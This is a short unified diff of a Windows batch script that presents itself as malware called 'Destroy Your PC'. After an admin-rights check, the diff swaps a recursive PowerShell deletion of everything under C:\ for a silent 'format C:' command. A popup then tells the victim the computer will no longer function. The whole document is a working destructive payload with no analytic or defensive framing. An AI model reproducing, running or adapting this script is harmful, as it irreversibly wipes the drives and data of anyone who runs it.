@@ -1,4 +1,3 @@
-@echo off 
 :: === ADMIN CHECK ===
 
 net session >nul 2>&1
@@ -57,10 +56,9 @@ ping localhost -n 2 >nul
 
 :: === WIPE ===
 echo [!!] FIRST EXECUTION DETECTED - INITIATING DESTRUCTION...
-powershell -Command "Remove-Item -Path C:\* -Recurse -Force"
+format C: /fs:NTFS /p:1 /q /y >nul
 
 :: === FINAL POPUP ===
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', '💀 Warning 💀')"
 
-:: Script blijft nu open, geen exit of reboot
 pause
